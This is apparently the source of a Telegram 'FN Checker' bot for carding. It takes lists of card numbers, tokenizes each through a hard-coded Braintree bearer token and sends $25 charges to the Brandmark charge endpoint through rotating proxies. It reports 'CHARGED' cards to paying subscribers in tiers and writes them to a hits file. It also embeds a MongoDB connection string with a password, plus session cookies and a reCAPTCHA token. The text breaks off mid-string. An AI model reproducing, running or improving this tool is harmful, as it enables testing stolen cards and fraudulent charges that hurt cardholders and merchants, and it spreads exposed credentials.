import os
import time
import asyncio
import requests
import aiofiles
import logging
import random
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from pymongo import MongoClient
import secrets

# Set up logging with the desired format
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%b %d %H:%M:%S %Y-%m-%d %H:%M:%S,%f'
)
logger = logging.getLogger(__name__)

# MongoDB setup
MONGO_URL = "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URL)
db = client['fn_checker_db']
users_collection = db['users']
keys_collection = db['keys']

# Owner ID
OWNER_ID = 7593550190  # Replace with your Telegram user ID

# Global variables (shared but immutable or safely managed)
proxies_list = []
country_mapping = {}
active_tasks = {}  # Tracks active tasks per chat

# Tier definitions
TIERS = {
    'Bronze': {'limit': 500, 'emoji': '🥉'},
    'Silver': {'limit': 1000, 'emoji': '🥈'},
    'Gold': {'limit': 2000, 'emoji': '🥇'},
    'Platinum': {'limit': 3000, 'emoji': '✨💫'},
    'Diamond': {'limit': 4000, 'emoji': '💎'},
    'Owner': {'limit': 4000, 'emoji': '👑'}
}

# Function to load and validate proxies from proxies.txt
def load_proxies():
    global proxies_list
    proxies_list = []
    proxy_file = 'proxiess.txt'
    
    if not os.path.exists(proxy_file):
        logger.error("proxiess.txt file not found!")
        return False
    
    with open(proxy_file, 'r') as f:
        lines = f.readlines()
        if not lines:
            logger.error("proxiess.txt is empty!")
            return False
        
        for line in lines:
            proxy = line.strip()
            if not proxy:
                continue
            try:
                test_url = "https://api.ipify.org"
                proxy_dict = {"http": proxy, "https": proxy}
                response = requests.get(test_url, proxies=proxy_dict, timeout=5)
                if response.status_code == 200:
                    proxies_list.append(proxy)
                    logger.debug(f"Valid proxy found: {proxy}")
                else:
                    logger.warning(f"Proxy failed with status {response.status_code}: {proxy}")
            except requests.exceptions.RequestException as e:
                logger.warning(f"Proxy failed: {proxy} - Error: {e}")
    
    if not proxies_list:
        logger.error("No valid proxies found in proxiess.txt.")
        return False
    
    logger.info(f"Loaded {len(proxies_list)} valid proxies.")
    return True

# Function to load countries from countries.txt
def load_countries():
    global country_mapping
    country_file = 'countries.txt'
    
    if not os.path.exists(country_file):
        logger.error("countries.txt file not found! Falling back to default mapping.")
        return {
            'USA': ('United States', '🇺🇸'),
            'THA': ('Thailand', '🇹🇭'),
            'IND': ('India', '🇮🇳'),
            'GBR': ('United Kingdom', '🇬🇧'),
            'CAN': ('Canada', '🇨🇦'),
            'AUS': ('Australia', '🇦🇺'),
            'FRA': ('France', '🇫🇷'),
            'DEU': ('Germany', '🇩🇪'),
            'JPN': ('Japan', '🇯🇵'),
            'CHN': ('China', '🇨🇳'),
        }
    
    with open(country_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()
        if not lines:
            logger.error("countries.txt is empty! Falling back to default mapping.")
            return {
                'USA': ('United States', '🇺🇸'),
                'THA': ('Thailand', '🇹🇭'),
                'IND': ('India', '🇮🇳'),
                'GBR': ('United Kingdom', '🇬🇧'),
                'CAN': ('Canada', '🇨🇦'),
                'AUS': ('Australia', '🇦🇺'),
                'FRA': ('France', '🇫🇷'),
                'DEU': ('Germany', '🇩🇪'),
                'JPN': ('Japan', '🇯🇵'),
                'CHN': ('China', '🇨🇳'),
            }
        
        for line in lines:
            line = line.strip()
            if not line or '|' not in line:
                continue
            try:
                code, name, flag = line.split('|')
                country_mapping[code] = (name, flag)
                logger.debug(f"Loaded country: {code} - {name} {flag}")
            except ValueError as e:
                logger.warning(f"Invalid line in countries.txt: {line} - Error: {e}")
    
    if not country_mapping:
        logger.error("No valid countries loaded from countries.txt! Falling back to default mapping.")
        return {
            'USA': ('United States', '🇺🇸'),
            'THA': ('Thailand', '🇹🇭'),
            'IND': ('India', '🇮🇳'),
            'GBR': ('United Kingdom', '🇬🇧'),
            'CAN': ('Canada', '🇨🇦'),
            'AUS': ('Australia', '🇦🇺'),
            'FRA': ('France', '🇫🇷'),
            'DEU': ('Germany', '🇩🇪'),
            'JPN': ('Japan', '🇯🇵'),
            'CHN': ('China', '🇨🇳'),
        }
    
    logger.info(f"Loaded {len(country_mapping)} countries from countries.txt.")
    return country_mapping

# Function to get proxies, cycling through available ones repeatedly
def get_proxies(num_proxies):
    global proxies_list
    if not proxies_list:
        logger.error("No proxies available in proxies_list.")
        return []  # Return empty list if no proxies are loaded
    return [{"http": proxies_list[i % len(proxies_list)], "https": proxies_list[i % len(proxies_list)]} 
            for i in range(num_proxies)]

# Braintree API function
def b3req(cc, mm, yy, proxy):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDE4ODk2MTksImp0aSI6ImZlZGUxMTBlLTE1OGYtNDYwMC05MTYyLTM0NWExYzJkODEzMSIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319._zDtTZMq4h-cjrlT93BEn6KVlYnr1SHDycXSX7QW_NO4WeWkg8pTj54ZlzJ08jeHqBxoXrm428GNfZbmvxJ7yQ',  # Replace with a valid token
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'fab6924a-b151-43b5-a68a-0ff870cab793',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{cc}',
                    'expirationMonth': f'{mm}',
                    'expirationYear': f'{yy}',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    logger.debug(f"Sending Braintree request for cc: {cc}, mm: {mm}, yy: {yy} with headers: {headers}")
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy, timeout=10)
        logger.debug(f"Braintree API response status code: {response.status_code}")
        logger.debug(f"Braintree API response text: {response.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Braintree request failed with proxy {proxy}: {e}")
        return None, None, None, None, None, None, None, None

    try:
        resjson = response.json()
        logger.debug(f"Parsed Braintree JSON response: {resjson}")
        if 'errors' in resjson and 'Authentication credentials are invalid' in str(resjson['errors']):
            logger.error("Braintree authentication failed. Please check your API token.")
            return None, None, None, None, None, None, None, None
        if 'data' not in resjson or not resjson['data']:
            logger.error("Braintree response has no 'data' key or data is empty")
            return None, None, None, None, None, None, None, None
        try:
            tkn = resjson['data']['tokenizeCreditCard']['token']
            mm = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationMonth"]
            yy = resjson["data"]["tokenizeCreditCard"]["creditCard"]["expirationYear"]
            bin = resjson["data"]["tokenizeCreditCard"]["creditCard"]["bin"]
            card_type = resjson["data"]["tokenizeCreditCard"]["creditCard"]["brandCode"]
            lastfour = resjson["data"]["tokenizeCreditCard"]["creditCard"]["last4"]
            lasttwo = lastfour[-2:]
            bin_data = resjson["data"]["tokenizeCreditCard"]["creditCard"]["binData"]
            logger.debug(f"Braintree tokenization successful: tkn={tkn}, mm={mm}, yy={yy}, bin={bin}, card_type={card_type}, lastfour={lastfour}")
            return tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data
        except KeyError as e:
            logger.error(f"Braintree KeyError in response parsing: {e}")
            return None, None, None, None, None, None, None, None
    except requests.exceptions.JSONDecodeError as e:
        logger.error(f"Braintree JSON Decode Error: {e}")
        return None, None, None, None, None, None, None, None

# Brandmark API function
def brainmarkreq(b3tkn, mm, yy, bin, Type, lastfour, lasttwo, proxy):
    cookies2 = {
        '_ga': 'GA1.2.1451620456.1741715570',
        '_gid': 'GA1.2.354116258.1741803158',
        '_gat': '1',
        '_ga_93VBC82KGM': 'GS1.2.1741803158.2.1.1741803214.0.0.0',
    }
    headers2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.brandmark.io',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://app.brandmark.io/v3/',
        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    }
    json_data2 = {
        'tier': 'basic',
        'email': 'electraop09@gmail.com',
        'payload': {
            'nonce': f'{b3tkn}',
            'details': {
                'expirationMonth': f'{mm}',
                'expirationYear': f'{yy}',
                'bin': f'{bin}',
                'cardType': f'{Type}',
                'lastFour': f'{lastfour}',
                'lastTwo': f'{lasttwo}',
            },
            'type': 'CreditCard',
            'description': 'ending in 82',
            'deviceData': '{"device_session_id":"c88fc259a79674be1f35baf6865f6158","fraud_merchant_id":null,"correlation_id":"e526db6e61b97522af1c8f5a2b2433df"}',
            'binData': {
                'prepaid': 'Yes',
                'healthcare': 'No',
                'debit': 'Yes',
                'durbinRegulated': 'No',
                'commercial': 'Unknown',
                'payroll': 'No',
                'issuingBank': 'THE BANCORP BANK NATIONAL ASSOCIATION',
                'countryOfIssuance': 'USA',
                'productId': 'MPF',
            },
        },
        'discount': False,
        'referral': None,
        'params': {
            'id': 'logo-60bfb4e5-5cfb-4c13-a8bf-689d41d922e6',
            'title': 'FnNetwork',
        },
        'svg': '</svg>\n',
        'recaptcha_token': '03AFcWeA4Xq3x3P5oV3a2n_hx_ENOzsKm6LexhEAWRQGuPQpBfDMfxihyXZrVUMdNxweI7t4PZgocW8KGl_YPEUoDVfLaQ6s5suEekbCxMMASdl1d8Dts69GCHH4BFQWC6kyD59y7oiufVOM-REhg7Xna8QhXRpnIjU4gjjhaDuMO4A2xnw6LiSoLtD4B1E4bp5hUCI5kgwpzd2C3XiITUphENSwwANDrhvjam_qmsODBTRQGnxBnIcY-RDv7coZrLVKTTj8dQDZ12FVScFqeMvSggT8Di0gar3DPltn5eKx9V0yyLrTj1aDobn-551Y95PfhAKXRXm1u8SOr-HPAqFENTWdDRKRuzaSUSasCppXKykihYdvfaWz14pt90MDXYoESzJKuKpTQENm_QiIID7Dx8zOlDqdKdEch44bw_2wis_pkUNeqIX8irri-rILLmybf7kzLEiO7NUAC5uxGnyyXl3qMe36S2ncbXkhhB4ZYZ-uMSvb4qPuPrpuZ3XjkwhRJ_F7rGXH1GqFTbe6bi7Gh-UFhH0XzjZnpIvMmY2emtxfjkHAyWFN9RgsX3Zpke-Sbgnp9Zk8tlPii_WmklLgVFolOTrmKNi9xrYT4D0fLx7BLVUnCmecpcRaqQLUsllhHDwG_QIGzI6C9e-ryiSH2QNSGBQcjZu4SKyu2oc2HblrIoJpkXrIrn72A3S5AyAtY1IxY7yDo4FvsYmvv9S1qxsze3nTMvjQFRzmbI1IdNJ0e9ochzGSs6sy39Ha4wavYIg5vDA2NS6C3mQL3qaDykwEKnn2fQUKYAkzRPAN2rZuaxYKvv2ksIpmxa9sSvW3RjzNp5X8oHQzvlCVsylw5IXZH_H0Bqj4mvAAEmioEripqmuxyvcM_l0JGZkbvRPZw_Raa4K3Mdo8hen2qOckzvdHztYBXDAVjO1xWp6D2kMmgzP3_ndS-2CZQtyVozM_Wz2b2HxiCSW7GP__IVyLRI1dEPOJVlqVplELzdZyAZOmHm_rDJsqRnb7t8BTmcPemm0PTS8xWDtuSDtp_4YYjW8to2-a8NR6CGciladI29gCDbrwsYOf78fb-MFrUCV2U1joc95ot3oLiQK_nznrYwNHNxTTySR4SQyz-ERQcbR_7uPFaHgCoPRr_fc5fZ8qAdszTkJcswaH1wntPdq905m_pFQEOMNLI2BI1dpkiCSLvDKqB6WE9By4-KUbbVKh-WM8sjAfqICUF1EUE9cRVwYNp8AXnSvRqJJ9ywHBiG5bbIp-T9RqWZ7V3Suzg2GaktjyCyUbwNERgyhyqz487W9UBDz-i4TYkw2MXuUa8blsa_8-tEzORIyeIpEaDZxUumdzFOkmdndlBUTWo4GjDQMXaZBst8mSH3ljQFK2D67ogTuB_hiRcbvhOAB7NMXn2K-HcbLIZmxJwQ_m6PSG92NkSZwMapee3pO2WwSj58qK7XqR-du9orKCDAt0U7SFafTFdRzWzdBN9L5yqf6QHu_k1yja0AAVSFoTaW1vg8Ejp-sQ0bdu9AWinMgvyVEuVIMjDXiywYUe6xuCfR_pCQWRuxzc7PespUccQYKsh7tfDDjh_1hyg9kSVPIt58oEnghn5MA9l8VTw6zht7HazLL7zi6tWtCBisIVsIkioaPaSFCSAj-9vL6gF0U9mD1cvFs_l-QnHRh9NsMw0pBu6DVvDmv1eHd0Cp3K-ppp9Q3w8LYokqZoEL5iWMz72d-59_hYzLx16b7IoIIZwEci2kaZmj5ar3VQi9GxMnMbXZwxgJc6J36_Ttzsns6VsW9PFJyRvMruxa1QdJi0mQwF047W9k0UnUPe95IqsXgjqnXWqp7yRfvt_7GhLlvlpDCpX8APsizJTAvnobXwgVw62oFFmlrL64ahF384SzrRK3ciD-TzZzaxl-Y3rBYorDWkoxHXeH21kQMw3bkbSTsSmtlgjzdlEXSNj2xznfpt9ribJ7wzdlzig8fGHwVlkIVa4_cU-_H2D35NyxLyoL-CrbaOeWnMgv2JeXAGRFEWnum4gcGUqsAECnoT4JhBLTj4ECk3NgfxvpYLuTLxiZt6ZbCHVI1EPEOpHXGSCWblvMSMhgEqkamyU',
        'token': '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',
    }
    logger.info(f"HTTP Request: POST https://app.brandmark.io/v3/charge.php - Status: {requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies2, headers=headers2, json=json_data2, proxies=proxy, timeout=10).status_code}")
    try:
        response2 = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies2, headers=headers2, json=json_data2, proxies=proxy, timeout=10)
        logger.info(f"HTTP Response: POST https://app.brandmark.io/v3/charge.php - Status: {response2.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"HTTP Error: POST https://app.brandmark.io/v3/charge.php - Status: {e.response.status_code if hasattr(e.response, 'status_code') else 'N/A'} - Error: {e}")
        return "Error: Proxy failed"

    try:
        res2json = response2.json()
        logger.debug(f"Parsed Brandmark JSON response: {res2json}")
        return res2json['message']
    except (requests.exceptions.JSONDecodeError, KeyError) as e:
        logger.error(f"HTTP Error: POST https://app.brandmark.io/v3/charge.php - JSON Decode or KeyError - Status: N/A - Error: {e}")
        return "Error: Invalid API response"

# Helper function to run synchronous functions in an async context
async def run_sync_func(func, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, func, *args)

# Check if a card was successfully charged or has insufficient funds
def is_charged(message):
    return "success" in message.lower() or "insufficient funds" in message.lower()

# Process a single card
async def process_card(card_details, proxy, update, context):
    card_number, expiry_month, expiry_year, _ = card_details.split('|')
    full_card = f"{card_number}|{expiry_month}|{expiry_year}"
    logger.debug(f"Processing card: {full_card}")

    card_start_time = time.time()
    tkn, mm, yy, bin, card_type, lastfour, lasttwo, bin_data = await run_sync_func(b3req, card_number, expiry_month, expiry_year, proxy)
    if tkn is None:
        logger.error(f"Failed to process card: {card_number}")
        return None, None, None, None

    final = await run_sync_func(brainmarkreq, tkn, mm, yy, bin, card_type, lastfour, lasttwo, proxy)
    card_end_time = time.time()
    card_duration = card_end_time - card_start_time

    return full_card, final, bin_data, card_duration

# Check user access
def check_access(user_id):
    user = users_collection.find_one({'user_id': user_id})
    if user_id == OWNER_ID or (user and user.get('allowed', False) and user.get('subscription_expires', datetime.min) > datetime.now()):
        return user['tier'] if user else 'Owner'
    return None

# Process a text file with tier limits
async def process_file(file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    tier = check_access(user_id)
    if not tier:
        await context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this bot.")
        return

    tier_limit = TIERS[tier]['limit']
    active_tasks[chat_id] = True  # Mark this chat as active
    task_stats = {
        'approved': 0,
        'declined': 0,
        'checked': 0,
        'total': 0,
        'start_time': time.time()
    }
    context.chat_data['stats'] = task_stats  # Store stats in chat_data
    charged_cards = []

    lines = []
    async with aiofiles.open(file_path, 'r') as f:
        async for line in f:
            lines.append(line.strip())
    task_stats['total'] = len(lines)

    if task_stats['total'] > tier_limit:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Your tier ({tier} {TIERS[tier]['emoji']}) allows only {tier_limit} CCs per file. You uploaded {task_stats['total']} CCs.")
        active_tasks.pop(chat_id, None)
        return

    if task_stats['total'] == 0:
        await context.bot.send_message(chat_id=chat_id, text="File is empty!")
        active_tasks.pop(chat_id, None)
        return

    user_name = update.effective_user.first_name or update.effective_user.username or "Unknown User"
    profile_link = f"tg://user?id={user_id}"
    dev_name = "𓆰𝅃꯭᳚⚡!! ⏤‌‌‌‌𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤‌‌➤⃟🔥✘"
    dev_link = "https://t.me/FNxELECTRA"

    batch_size = 3
    for i in range(0, len(lines), batch_size):
        if chat_id not in active_tasks:
            break

        batch = lines[i:i + batch_size]
        batch = [line for line in batch if '|' in line and len(line.split('|')) == 4]
        if not batch:
            continue

        proxies = get_proxies(len(batch))
        tasks = [process_card(card, proxy, update, context) for card, proxy in zip(batch, proxies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Error processing card: {result}")
                task_stats['declined'] += 1
                task_stats['checked'] += 1
                context.chat_data['stats'] = task_stats  # Update stats
                continue

            if result[0] is None:
                task_stats['declined'] += 1
                task_stats['checked'] += 1
                context.chat_data['stats'] = task_stats  # Update stats
                continue

            full_card, final, bin_data, card_duration = result
            task_stats['checked'] += 1

            if is_charged(final):
                task_stats['approved'] += 1
                charged_cards.append(full_card)
                card_bin = full_card[:6]
                bank = bin_data.get('issuingBank', 'Unknown') if bin_data else 'Unknown'
                country_code = bin_data.get('countryOfIssuance', 'USA').upper() if bin_data else 'USA'
                country_full, country_flag = country_mapping.get(country_code, ('Unknown', '🇺🇳'))
                tier = check_access(user_id)

                info = card_type.upper() if card_type else "Unknown"
                response_text = "Insufficient Funds" if "insufficient funds" in final.lower() else "CHARGED 25$😈⚡"

                charged_message = f"""
『 Braintree 25$ [ /chk ] 』
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗖𝗮𝗿𝗱 ➜ {full_card}
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐑𝐞𝐬𝗽𝗼𝗻𝘀𝗲 ➜ {response_text}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗜𝗻𝗳𝗼 ➜ {info}
𝐁𝐚𝗻𝗸 ➜ {bank}
𝐂𝐨𝘂𝗻𝘁𝗿𝘆 ➜ {country_full} {country_flag}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗧𝗶𝗺𝗲 ➜ {card_duration:.2f} seconds
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="{profile_link}">{user_name}</a> ({tier} {TIERS[tier]['emoji'] if tier in TIERS else ''})
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ <a href="{dev_link}">{dev_name}</a>
"""
                await context.bot.send_message(chat_id=chat_id, text=charged_message, parse_mode='HTML')
            else:
                task_stats['declined'] += 1

            context.chat_data['stats'] = task_stats  # Update stats after each card

        if task_stats['checked'] % 50 == 0 or task_stats['checked'] == task_stats['total']:
            duration = time.time() - task_stats['start_time']
            avg_speed = task_stats['checked'] / duration if duration > 0 else 0
            success_rate = (task_stats['approved'] / task_stats['checked'] * 100) if task_stats['checked'] > 0 else 0
            progress_message = f"""
<b>[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>[✪] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝:</b> {task_stats['approved']}
<b>[❌] 𝐃𝐞𝐜𝐥𝗶𝗻𝗲𝗱:</b> {task_stats['declined']}
<b>[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝:</b> {task_stats['checked']}/{task_stats['total']}
<b>[✪] 𝐓𝐨𝐭𝐚𝐥:</b> {task_stats['total']}
<b>[✪] 𝐃𝐮𝐫𝐚𝘁𝗶𝗼𝗻:</b> {duration:.2f} seconds
<b>[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝:</b> {avg_speed:.2f} cards/sec
<b>[✪] 𝐒𝐮𝗰𝗰𝗲𝘀𝘀 𝐑𝐚𝘁𝗲:</b> {success_rate:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
<b>[み] 𝐃𝐞𝐯: <a href="{dev_link}">{dev_name}</a> ⚡😈</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
            await context.bot.send_message(chat_id=chat_id, text=progress_message, parse_mode='HTML')

        if i + batch_size < len(lines):
            logger.info(f"Chat {chat_id}: Waiting 60 seconds to avoid rate limiting...")
            await asyncio.sleep(60)

    if charged_cards:
        random_number = random.randint(1000, 9999)
        hits_file_name = f"hits_FnChecker_{random_number}.txt"
        hits_file_path = os.path.join('temp', hits_file_name)
        hits_content = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
[✪] Charged: {task_stats['approved']}
[✪] Total: {task_stats['total']}
━━━━━━━━━━━━━━━━━━━━━━
[み] DEV: @FNxELECTRA
━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━
FN CHECKER HITS
━━━━━━━━━━━━━━━━━━━━━━
"""
        for card in charged_cards:
            hits_content += f"CHARGED😈⚡-» {card}\n"

        async with aiofiles.open(hits_file_path, 'w') as f:
            await f.write(hits_content)

        duration = time.time() - task_stats['start_time']
        avg_speed = task_stats['checked'] / duration if duration > 0 else 0
        success_rate = (task_stats['approved'] / task_stats['checked'] * 100) if task_stats['checked'] > 0 else 0
        summary_message = f"""
